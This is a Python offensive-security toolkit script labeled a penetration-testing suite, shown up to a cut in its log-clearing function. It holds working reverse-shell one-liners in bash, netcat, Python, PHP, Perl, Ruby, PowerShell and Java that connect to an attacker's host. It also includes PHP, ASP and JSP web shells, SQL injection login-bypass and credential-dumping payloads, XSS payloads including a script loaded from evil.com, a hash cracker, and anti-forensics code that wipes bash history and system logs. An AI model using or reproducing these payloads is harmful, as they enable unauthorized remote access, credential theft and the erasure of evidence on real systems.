#!/usr/bin/env python3
"""
Enhanced Parrot OS Cybersecurity Suite v2.0
Professional-grade penetration testing and security assessment toolkit
Author: Security Research Team
"""

import os
import sys
import socket
import subprocess
import threading
import json
import re
import time
import sqlite3
import hashlib
import base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
from pathlib import Path

try:
    import requests
    from bs4 import BeautifulSoup
    import dns.resolver
except ImportError:
    print("[!] Missing dependencies. Installing...")
    os.system("pip3 install requests beautifulsoup4 dnspython")
    print("[+] Please restart the script")
    sys.exit(1)

# ==================== CONFIGURATION ====================
CONFIG = {
    'threads': 100,
    'timeout': 3,
    'user_agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
    'db_path': './security_suite.db',
    'log_dir': './logs',
    'reports_dir': './reports',
    'wordlists_dir': './wordlists'
}

# Create necessary directories
for directory in [CONFIG['log_dir'], CONFIG['reports_dir'], CONFIG['wordlists_dir']]:
    Path(directory).mkdir(parents=True, exist_ok=True)

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# ==================== DATABASE ====================
class Database:
    def __init__(self):
        self.conn = sqlite3.connect(CONFIG['db_path'])
        self.cursor = self.conn.cursor()
        self.init_db()
    
    def init_db(self):
        """Initialize database tables"""
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS scans (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT,
                scan_type TEXT,
                timestamp TEXT,
                results TEXT
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT,
                vuln_type TEXT,
                severity TEXT,
                description TEXT,
                timestamp TEXT
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target TEXT,
                username TEXT,
                password TEXT,
                service TEXT,
                timestamp TEXT
            )
        ''')
        
        self.conn.commit()
    
    def save_scan(self, target, scan_type, results):
        """Save scan results"""
        self.cursor.execute(
            'INSERT INTO scans (target, scan_type, timestamp, results) VALUES (?, ?, ?, ?)',
            (target, scan_type, datetime.now().isoformat(), json.dumps(results))
        )
        self.conn.commit()
    
    def save_vulnerability(self, target, vuln_type, severity, description):
        """Save vulnerability"""
        self.cursor.execute(
            'INSERT INTO vulnerabilities (target, vuln_type, severity, description, timestamp) VALUES (?, ?, ?, ?, ?)',
            (target, vuln_type, severity, description, datetime.now().isoformat())
        )
        self.conn.commit()
    
    def get_scan_history(self, target=None):
        """Get scan history"""
        if target:
            self.cursor.execute('SELECT * FROM scans WHERE target = ? ORDER BY timestamp DESC', (target,))
        else:
            self.cursor.execute('SELECT * FROM scans ORDER BY timestamp DESC LIMIT 50')
        return self.cursor.fetchall()
    
    def get_vulnerabilities(self, target=None):
        """Get vulnerabilities"""
        if target:
            self.cursor.execute('SELECT * FROM vulnerabilities WHERE target = ?', (target,))
        else:
            self.cursor.execute('SELECT * FROM vulnerabilities ORDER BY timestamp DESC')
        return self.cursor.fetchall()
    
    def close(self):
        self.conn.close()

db = Database()

# ==================== LOGGER ====================
class Logger:
    def __init__(self):
        self.session_file = f"{CONFIG['log_dir']}/session_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    
    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] [{level}] {message}\n"
        
        with open(self.session_file, 'a') as f:
            f.write(log_entry)
        
        # Also print to console with colors
        color = {
            'INFO': Colors.CYAN,
            'SUCCESS': Colors.GREEN,
            'WARNING': Colors.YELLOW,
            'ERROR': Colors.RED,
            'DEBUG': Colors.BLUE
        }.get(level, Colors.WHITE)
        
        print(f"{color}[{level}]{Colors.RESET} {message}")
    
    def save_results(self, data, filename):
        filepath = f"{CONFIG['log_dir']}/{filename}"
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=4)
        return filepath

logger = Logger()

# ==================== UTILITIES ====================
def banner():
    print(f"{Colors.CYAN}{Colors.BOLD}")
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║                                                           ║
    ║   PARROT OS - ADVANCED CYBERSECURITY SUITE v2.0          ║
    ║                                                           ║
    ║        Professional Penetration Testing Toolkit          ║
    ║                Enhanced & Optimized                       ║
    ║                                                           ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    print(f"{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Session: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Logs: {logger.session_file}{Colors.RESET}")
    print(f"{Colors.YELLOW}[*] Database: {CONFIG['db_path']}{Colors.RESET}\n")

def clear():
    os.system('clear')

def check_root():
    """Check if running as root"""
    if os.geteuid() != 0:
        print(f"{Colors.YELLOW}[!] Warning: Not running as root{Colors.RESET}")
        print(f"{Colors.YELLOW}[!] Some features may not work. Run with: sudo python3 {sys.argv[0]}{Colors.RESET}\n")
        return False
    return True

def validate_ip(ip):
    """Validate IP address"""
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    if re.match(pattern, ip):
        return all(0 <= int(part) <= 255 for part in ip.split('.'))
    return False

def validate_url(url):
    """Validate URL"""
    pattern = r'^https?://'
    return re.match(pattern, url) is not None

# ==================== ADVANCED PORT SCANNER ====================
class AdvancedPortScanner:
    def __init__(self, target, threads=100):
        self.target = target
        self.threads = threads
        self.results = []
        self.lock = threading.Lock()
        
    def scan_port(self, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(CONFIG['timeout'])
            result = sock.connect_ex((self.target, port))
            
            if result == 0:
                try:
                    service = socket.getservbyport(port)
                except:
                    service = "unknown"
                
                banner = self.grab_banner(port)
                version = self.detect_version(banner) if banner else None
                
                port_info = {
                    'port': port,
                    'service': service,
                    'banner': banner,
                    'version': version,
                    'state': 'open'
                }
                
                with self.lock:
                    self.results.append(port_info)
                    print(f"{Colors.GREEN}[+] {port:5d} | {service:15s} | {banner[:50] if banner else 'No banner'}{Colors.RESET}")
                
                return port_info
            
            sock.close()
        except Exception as e:
            logger.log(f"Error scanning port {port}: {e}", "DEBUG")
        return None
    
    def grab_banner(self, port):
        """Enhanced banner grabbing"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.target, port))
            
            # Try HTTP request first
            if port in [80, 443, 8080, 8443]:
                request = f"GET / HTTP/1.1\r\nHost: {self.target}\r\n\r\n"
                sock.send(request.encode())
            else:
                sock.send(b'\r\n')
            
            banner = sock.recv(4096).decode('utf-8', errors='ignore').strip()
            sock.close()
            return banner
        except:
            return None
    
    def detect_version(self, banner):
        """Detect service version from banner"""
        if not banner:
            return None
        
        # Common version patterns
        patterns = {
            'Apache': r'Apache/([\d.]+)',
            'nginx': r'nginx/([\d.]+)',
            'OpenSSH': r'OpenSSH_([\d.]+)',
            'MySQL': r'MySQL ([\d.]+)',
            'FTP': r'FTP Server ([\d.]+)',
        }
        
        for service, pattern in patterns.items():
            match = re.search(pattern, banner)
            if match:
                return f"{service} {match.group(1)}"
        
        return None
    
    def scan(self, start_port=1, end_port=65535, common_only=False):
        """Perform port scan"""
        logger.log(f"Starting port scan on {self.target}", "INFO")
        
        if common_only:
            ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 
                    993, 995, 1433, 1723, 3306, 3389, 5432, 5900, 8080, 8443, 8888]
        else:
            ports = range(start_port, end_port + 1)
        
        print(f"{Colors.CYAN}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}Port Scan: {self.target} ({len(list(ports))} ports){Colors.RESET}")
        print(f"{Colors.CYAN}{'='*70}{Colors.RESET}\n")
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            list(executor.map(self.scan_port, ports))
        
        # Save to database
        db.save_scan(self.target, 'port_scan', self.results)
        logger.log(f"Port scan completed: {len(self.results)} open ports found", "SUCCESS")
        
        return self.results

# ==================== WEB VULNERABILITY SCANNER ====================
class WebVulnScanner:
    def __init__(self, url):
        self.url = url if url.startswith('http') else f'http://{url}'
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': CONFIG['user_agent']})
        
    def test_sql_injection(self):
        """Advanced SQL injection testing"""
        logger.log("Testing SQL injection vulnerabilities", "INFO")
        
        payloads = [
            ("'", "Single quote"),
            ("' OR '1'='1", "Basic OR bypass"),
            ("' OR '1'='1' --", "Comment bypass"),
            ("' OR '1'='1' /*", "Block comment"),
            ("admin' --", "Admin bypass"),
            ("' UNION SELECT NULL--", "UNION injection"),
            ("' AND 1=1--", "Boolean true"),
            ("' AND 1=2--", "Boolean false"),
            ("' WAITFOR DELAY '00:00:05'--", "Time-based"),
            ("1' ORDER BY 1--", "Column enumeration"),
        ]
        
        sql_errors = [
            'sql syntax', 'mysql', 'sqlite', 'postgresql', 'oracle',
            'odbc', 'jdbc', 'warning', 'error', 'syntax error',
            'unclosed quotation', 'quoted string'
        ]
        
        for payload, description in payloads:
            try:
                # Test GET parameter
                test_url = f"{self.url}?id={payload}"
                response = self.session.get(test_url, timeout=5)
                
                if any(error in response.text.lower() for error in sql_errors):
                    vuln = {
                        'type': 'SQL Injection',
                        'severity': 'CRITICAL',
                        'url': test_url,
                        'payload': payload,
                        'description': description,
                        'method': 'GET'
                    }
                    self.vulnerabilities.append(vuln)
                    db.save_vulnerability(self.url, 'SQL Injection', 'CRITICAL', description)
                    print(f"{Colors.RED}[!] CRITICAL: SQL Injection - {description}{Colors.RESET}")
                    
            except Exception as e:
                logger.log(f"Error testing SQL injection: {e}", "DEBUG")
    
    def test_xss(self):
        """Advanced XSS testing"""
        logger.log("Testing XSS vulnerabilities", "INFO")
        
        payloads = [
            ("<script>alert('XSS')</script>", "Basic script"),
            ("<img src=x onerror=alert('XSS')>", "Image tag"),
            ("<svg onload=alert('XSS')>", "SVG tag"),
            ("javascript:alert('XSS')", "JavaScript protocol"),
            ("<iframe src=javascript:alert('XSS')>", "Iframe injection"),
            ("<body onload=alert('XSS')>", "Body tag"),
            ("<input onfocus=alert('XSS') autofocus>", "Input tag"),
            ("'><script>alert('XSS')</script>", "Quote escape"),
        ]
        
        for payload, description in payloads:
            try:
                test_url = f"{self.url}?search={payload}"
                response = self.session.get(test_url, timeout=5)
                
                if payload in response.text:
                    vuln = {
                        'type': 'Cross-Site Scripting (XSS)',
                        'severity': 'HIGH',
                        'url': test_url,
                        'payload': payload,
                        'description': description
                    }
                    self.vulnerabilities.append(vuln)
                    db.save_vulnerability(self.url, 'XSS', 'HIGH', description)
                    print(f"{Colors.RED}[!] HIGH: XSS - {description}{Colors.RESET}")
                    
            except Exception as e:
                logger.log(f"Error testing XSS: {e}", "DEBUG")
    
    def check_security_headers(self):
        """Check for missing security headers"""
        logger.log("Checking security headers", "INFO")
        
        try:
            response = self.session.get(self.url, timeout=5)
            headers = response.headers
            
            security_headers = {
                'X-Frame-Options': 'Clickjacking protection',
                'X-Content-Type-Options': 'MIME sniffing protection',
                'Strict-Transport-Security': 'HTTPS enforcement',
                'Content-Security-Policy': 'XSS protection',
                'X-XSS-Protection': 'XSS filter',
                'Referrer-Policy': 'Referrer control',
                'Permissions-Policy': 'Feature control'
            }
            
            missing = []
            for header, description in security_headers.items():
                if header not in headers:
                    vuln = {
                        'type': 'Missing Security Header',
                        'severity': 'LOW',
                        'header': header,
                        'description': description
                    }
                    self.vulnerabilities.append(vuln)
                    missing.append(header)
                    print(f"{Colors.YELLOW}[!] LOW: Missing {header}{Colors.RESET}")
                else:
                    print(f"{Colors.GREEN}[+] Found: {header}{Colors.RESET}")
            
            return missing
            
        except Exception as e:
            logger.log(f"Error checking headers: {e}", "ERROR")
            return []
    
    def scan_directories(self):
        """Enhanced directory scanning"""
        logger.log("Scanning directories", "INFO")
        
        directories = [
            'admin', 'administrator', 'login', 'wp-admin', 'phpmyadmin',
            'cpanel', 'backup', 'backups', 'uploads', 'files', 'images',
            'css', 'js', 'includes', 'api', 'test', 'dev', 'staging',
            'old', 'temp', 'tmp', 'cache', 'logs', 'config', 'database',
            'db', 'sql', '.git', '.svn', '.env', 'robots.txt', 'sitemap.xml'
        ]
        
        found = []
        for directory in directories:
            try:
                url = f"{self.url}/{directory}"
                response = self.session.get(url, timeout=3, allow_redirects=False)
                
                if response.status_code in [200, 301, 302, 403]:
                    found.append({'dir': directory, 'status': response.status_code})
                    
                    color = Colors.GREEN if response.status_code == 200 else Colors.YELLOW
                    print(f"{color}[+] /{directory:20s} [{response.status_code}]{Colors.RESET}")
                    
            except:
                pass
        
        return found
    
    def test_file_upload(self):
        """Test for file upload vulnerabilities"""
        logger.log("Testing file upload vulnerabilities", "INFO")
        
        # Look for file upload forms
        try:
            response = self.session.get(self.url, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            upload_forms = soup.find_all('input', {'type': 'file'})
            if upload_forms:
                print(f"{Colors.YELLOW}[!] Found {len(upload_forms)} file upload form(s){Colors.RESET}")
                self.vulnerabilities.append({
                    'type': 'File Upload Form',
                    'severity': 'MEDIUM',
                    'description': 'Potential file upload vulnerability',
                    'count': len(upload_forms)
                })
        except Exception as e:
            logger.log(f"Error testing file upload: {e}", "DEBUG")
    
    def full_scan(self):
        """Perform comprehensive vulnerability scan"""
        print(f"\n{Colors.CYAN}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}Web Vulnerability Scan: {self.url}{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*70}{Colors.RESET}\n")
        
        self.test_sql_injection()
        print()
        self.test_xss()
        print()
        self.check_security_headers()
        print()
        self.scan_directories()
        print()
        self.test_file_upload()
        
        # Summary
        print(f"\n{Colors.CYAN}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}Scan Summary:{Colors.RESET}")
        
        severity_count = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
        for vuln in self.vulnerabilities:
            severity_count[vuln.get('severity', 'LOW')] += 1
        
        for severity, count in severity_count.items():
            if count > 0:
                color = {
                    'CRITICAL': Colors.RED,
                    'HIGH': Colors.MAGENTA,
                    'MEDIUM': Colors.YELLOW,
                    'LOW': Colors.BLUE
                }[severity]
                print(f"{color}[{severity}]{Colors.RESET} {count} vulnerabilities")
        
        print(f"{Colors.CYAN}{'='*70}{Colors.RESET}\n")
        
        # Save results
        db.save_scan(self.url, 'web_vuln_scan', self.vulnerabilities)
        logger.log(f"Web scan completed: {len(self.vulnerabilities)} issues found", "SUCCESS")
        
        return self.vulnerabilities

# ==================== NETWORK RECONNAISSANCE ====================
class NetworkRecon:
    @staticmethod
    def get_network_info():
        """Get comprehensive network information"""
        info = {}
        
        try:
            # Local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            info['local_ip'] = s.getsockname()[0]
            s.close()
        except:
            info['local_ip'] = "Unable to determine"
        
        # Hostname
        info['hostname'] = socket.gethostname()
        
        # Public IP
        try:
            response = requests.get('https://api.ipify.org?format=json', timeout=5)
            info['public_ip'] = response.json()['ip']
        except:
            info['public_ip'] = "Unable to determine"
        
        # Network interfaces
        try:
            result = subprocess.run(['ip', 'addr'], capture_output=True, text=True)
            info['interfaces'] = result.stdout
        except:
            info['interfaces'] = "Unable to retrieve"
        
        return info
    
    @staticmethod
    def dns_lookup(domain):
        """Enhanced DNS lookup"""
        results = {}
        
        try:
            # A records
            answers = dns.resolver.resolve(domain, 'A')
            results['A'] = [str(rdata) for rdata in answers]
            
            # MX records
            try:
                answers = dns.resolver.resolve(domain, 'MX')
                results['MX'] = [str(rdata) for rdata in answers]
            except:
                results['MX'] = []
            
            # NS records
            try:
                answers = dns.resolver.resolve(domain, 'NS')
                results['NS'] = [str(rdata) for rdata in answers]
            except:
                results['NS'] = []
            
            # TXT records
            try:
                answers = dns.resolver.resolve(domain, 'TXT')
                results['TXT'] = [str(rdata) for rdata in answers]
            except:
                results['TXT'] = []
            
        except Exception as e:
            logger.log(f"DNS lookup error: {e}", "ERROR")
        
        return results
    
    @staticmethod
    def subdomain_enum(domain):
        """Enhanced subdomain enumeration"""
        logger.log(f"Enumerating subdomains for {domain}", "INFO")
        
        subdomains = [
            'www', 'mail', 'ftp', 'localhost', 'webmail', 'smtp', 'pop', 'ns1',
            'webdisk', 'ns2', 'cpanel', 'whm', 'autodiscover', 'autoconfig', 'm',
            'imap', 'test', 'ns', 'blog', 'pop3', 'dev', 'www2', 'admin', 'forum',
            'news', 'vpn', 'ns3', 'mail2', 'new', 'mysql', 'old', 'lists', 'support',
            'mobile', 'mx', 'static', 'docs', 'beta', 'shop', 'sql', 'secure', 'demo',
            'cp', 'calendar', 'wiki', 'web', 'media', 'email', 'images', 'img', 'www1',
            'intranet', 'portal', 'video', 'sip', 'dns2', 'api', 'cdn', 'stats', 'dns1',
            'ns4', 'www3', 'dns', 'search', 'staging', 'server', 'mx1', 'chat', 'wap',
            'my', 'svn', 'mail1', 'sites', 'proxy', 'ads', 'host', 'crm', 'cms', 'backup',
            'mx2', 'lyncdiscover', 'info', 'apps', 'download', 'remote', 'db', 'forums',
            'store', 'relay', 'files', 'newsletter', 'app', 'live', 'owa', 'en', 'start'
        ]
        
        found = []
        
        def check_subdomain(sub):
            subdomain = f"{sub}.{domain}"
            try:
                socket.gethostbyname(subdomain)
                found.append(subdomain)
                print(f"{Colors.GREEN}[+] {subdomain}{Colors.RESET}")
                return subdomain
            except:
                return None
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            list(executor.map(check_subdomain, subdomains))
        
        logger.log(f"Found {len(found)} subdomains", "SUCCESS")
        db.save_scan(domain, 'subdomain_enum', found)
        
        return found
    
    @staticmethod
    def ping_sweep(network):
        """Perform ping sweep with nmap"""
        logger.log(f"Ping sweep on {network}", "INFO")
        
        try:
            result = subprocess.run(
                ['nmap', '-sn', network, '-oG', '-'],
                capture_output=True,
                text=True,
                timeout=300
            )
            
            hosts = []
            for line in result.stdout.split('\n'):
                if 'Up' in line:
                    match = re.search(r'(\d+\.\d+\.\d+\.\d+)', line)
                    if match:
                        ip = match.group(1)
                        hosts.append(ip)
                        print(f"{Colors.GREEN}[+] {ip} is alive{Colors.RESET}")
            
            logger.log(f"Found {len(hosts)} live hosts", "SUCCESS")
            return hosts
            
        except FileNotFoundError:
            logger.log("nmap not found. Install with: sudo apt install nmap", "ERROR")
            return []
        except Exception as e:
            logger.log(f"Ping sweep error: {e}", "ERROR")
            return []

# ==================== EXPLOIT TOOLS ====================
class ExploitTools:
    @staticmethod
    def search_exploitdb(query):
        """Search exploit-db"""
        logger.log(f"Searching Exploit-DB for: {query}", "INFO")
        
        try:
            result = subprocess.run(
                ['searchsploit', query, '--json'],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode == 0:
                data = json.loads(result.stdout)
                exploits = data.get('RESULTS_EXPLOIT', [])
                
                print(f"\n{Colors.GREEN}[+] Found {len(exploits)} exploits{Colors.RESET}\n")
                
                for i, exploit in enumerate(exploits[:20], 1):
                    print(f"{Colors.CYAN}{i:2d}.{Colors.RESET} {exploit.get('Title', 'N/A')}")
                    print(f"    Path: {exploit.get('Path', 'N/A')}")
                    print()
                
                return exploits
            else:
                print(result.stdout)
                return []
                
        except FileNotFoundError:
            logger.log("searchsploit not found. Install with: sudo apt install exploitdb", "ERROR")
            return []
        except Exception as e:
            logger.log(f"Error searching exploits: {e}", "ERROR")
            return []
    
    @staticmethod
    def search_cve(query):
        """Search CVE database"""
        logger.log(f"Searching CVE for: {query}", "INFO")
        
        try:
            url = f"https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword={query}"
            response = requests.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            cves = []
            for link in soup.find_all('a', href=re.compile('CVE-')):
                cve_id = link.text.strip()
                if cve_id.startswith('CVE-'):
                    cves.append(cve_id)
                    print(f"{Colors.GREEN}[+] {cve_id}{Colors.RESET}")
            
            logger.log(f"Found {len(cves)} CVEs", "SUCCESS")
            return cves[:20]
            
        except Exception as e:
            logger.log(f"CVE search error: {e}", "ERROR")
            return []
    
    @staticmethod
    def metasploit_search(query):
        """Search Metasploit modules"""
        logger.log(f"Searching Metasploit for: {query}", "INFO")
        
        try:
            result = subprocess.run(
                ['msfconsole', '-q', '-x', f'search {query}; exit'],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            print(result.stdout)
            return result.stdout
            
        except FileNotFoundError:
            logger.log("msfconsole not found. Install with: sudo apt install metasploit-framework", "ERROR")
            return None
        except Exception as e:
            logger.log(f"Metasploit search error: {e}", "ERROR")
            return None

# ==================== PAYLOAD GENERATOR ====================
class PayloadGenerator:
    @staticmethod
    def reverse_shell(lhost, lport, shell_type='bash'):
        """Generate reverse shell payloads"""
        payloads = {
            'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            'python3': f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            'nc': f"nc -e /bin/sh {lhost} {lport}",
            'nc_alt': f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            'php': f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'ruby': f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            'perl': f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            'powershell': f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
            'java': f"r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]); p.waitFor();",
        }
        
        return payloads.get(shell_type, "Invalid shell type")
    
    @staticmethod
    def web_shells():
        """Generate web shell payloads"""
        return {
            'php_simple': "<?php system($_GET['cmd']); ?>",
            'php_full': "<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; }?>",
            'asp': "<%response.write CreateObject(\"WScript.Shell\").Exec(Request.QueryString(\"cmd\")).StdOut.Readall()%>",
            'jsp': "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
        }
    
    @staticmethod
    def sql_injection():
        """SQL injection payloads"""
        return {
            'auth_bypass': [
                "admin' --",
                "admin' #",
                "admin'/*",
                "' or 1=1--",
                "' or 1=1#",
                "' or 1=1/*",
                "') or '1'='1--",
                "') or ('1'='1--"
            ],
            'union_select': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT username,password FROM users--"
            ],
            'time_based': [
                "' AND SLEEP(5)--",
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND pg_sleep(5)--"
            ],
            'error_based': [
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
                "' AND extractvalue(1,concat(0x7e,version()))--"
            ]
        }
    
    @staticmethod
    def xss_payloads():
        """XSS payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "javascript:alert('XSS')",
            "<script src=//evil.com/xss.js></script>"
        ]
    
    @staticmethod
    def encode_payload(payload, encoding='base64'):
        """Encode payloads"""
        if encoding == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding == 'url':
            import urllib.parse
            return urllib.parse.quote(payload)
        elif encoding == 'hex':
            return payload.encode().hex()
        return payload

# ==================== PASSWORD TOOLS ====================
class PasswordTools:
    @staticmethod
    def generate_password(length=16, include_symbols=True):
        """Generate secure password"""
        import random
        import string
        
        chars = string.ascii_letters + string.digits
        if include_symbols:
            chars += string.punctuation
        
        password = ''.join(random.choice(chars) for _ in range(length))
        return password
    
    @staticmethod
    def generate_wordlist(base_word, output_file=None):
        """Generate wordlist with mutations"""
        logger.log(f"Generating wordlist from: {base_word}", "INFO")
        
        mutations = set()
        
        # Original
        mutations.add(base_word)
        mutations.add(base_word.lower())
        mutations.add(base_word.upper())
        mutations.add(base_word.capitalize())
        
        # Leet speak
        leet_map = {
            'a': ['@', '4'], 'e': ['3'], 'i': ['1', '!'],
            'o': ['0'], 's': ['5', '$'], 't': ['7'],
            'l': ['1'], 'g': ['9'], 'b': ['8']
        }
        
        for char, replacements in leet_map.items():
            for repl in replacements:
                mutations.add(base_word.replace(char, repl))
                mutations.add(base_word.replace(char.upper(), repl))
        
        # Common patterns
        years = list(range(1990, 2026))
        for year in years:
            mutations.add(f"{base_word}{year}")
            mutations.add(f"{year}{base_word}")
        
        # Numbers
        for i in range(0, 1000):
            mutations.add(f"{base_word}{i}")
            mutations.add(f"{i}{base_word}")
        
        # Special characters
        specials = ['!', '@', '#', '$', '*', '123', '!@#', '!!!']
        for special in specials:
            mutations.add(f"{base_word}{special}")
            mutations.add(f"{special}{base_word}")
        
        # Common suffixes
        suffixes = ['123', 'admin', 'user', 'test', 'password', 'pass']
        for suffix in suffixes:
            mutations.add(f"{base_word}{suffix}")
            mutations.add(f"{base_word}_{suffix}")
        
        mutations_list = sorted(list(mutations))
        
        if output_file:
            filepath = f"{CONFIG['wordlists_dir']}/{output_file}"
        else:
            filepath = f"{CONFIG['wordlists_dir']}/wordlist_{base_word}.txt"
        
        with open(filepath, 'w') as f:
            for word in mutations_list:
                f.write(word + '\n')
        
        logger.log(f"Generated {len(mutations_list)} passwords in {filepath}", "SUCCESS")
        return mutations_list
    
    @staticmethod
    def hash_text(text, algorithm='sha256'):
        """Hash text with various algorithms"""
        algorithms = {
            'md5': hashlib.md5,
            'sha1': hashlib.sha1,
            'sha224': hashlib.sha224,
            'sha256': hashlib.sha256,
            'sha384': hashlib.sha384,
            'sha512': hashlib.sha512
        }
        
        if algorithm in algorithms:
            h = algorithms[algorithm]()
            h.update(text.encode())
            return h.hexdigest()
        return None
    
    @staticmethod
    def crack_hash(hash_value, hash_type='md5', wordlist=None):
        """Simple hash cracker"""
        if not wordlist:
            wordlist = '/usr/share/wordlists/rockyou.txt'
        
        if not os.path.exists(wordlist):
            logger.log("Wordlist not found", "ERROR")
            return None
        
        logger.log(f"Cracking {hash_type} hash...", "INFO")
        
        try:
            with open(wordlist, 'r', encoding='latin-1') as f:
                for i, line in enumerate(f):
                    word = line.strip()
                    test_hash = PasswordTools.hash_text(word, hash_type)
                    
                    if test_hash == hash_value:
                        logger.log(f"Hash cracked: {word}", "SUCCESS")
                        return word
                    
                    if i % 10000 == 0:
                        print(f"{Colors.YELLOW}[*] Tested {i} passwords...{Colors.RESET}", end='\r')
            
            logger.log("Hash not found in wordlist", "WARNING")
            return None
            
        except Exception as e:
            logger.log(f"Error cracking hash: {e}", "ERROR")
            return None

# ==================== OPSEC & ANTI-FORENSICS ====================
class OPSECTools:
    @staticmethod
    def clear_bash_history():
        """Clear bash history"""
        logger.log("Clearing bash history", "INFO")
        
        try:
            # Clear current session
            os.system('history -c')
            
            # Clear history file
            os.system('cat /dev/null > ~/.bash_history')
            
            # Disable history logging
            os.system('unset HISTFILE')
            
            print(f"{Colors.GREEN}[+] Bash history cleared{Colors.RESET}")
            logger.log("Bash history cleared", "SUCCESS")
            return True
        except Exception as e:
            logger.log(f"Error clearing bash history: {e}", "ERROR")
            return False
    
    @staticmethod
    def clear_system_logs():
        """Clear system logs (requires root)"""
        logger.log("Clearing system logs", "WARNING")
        
        if os.geteuid() != 0:
            print(f"{Colors.RED}[!] Root privileges required{Colors.RESET}")
            return False
        
        logs = [
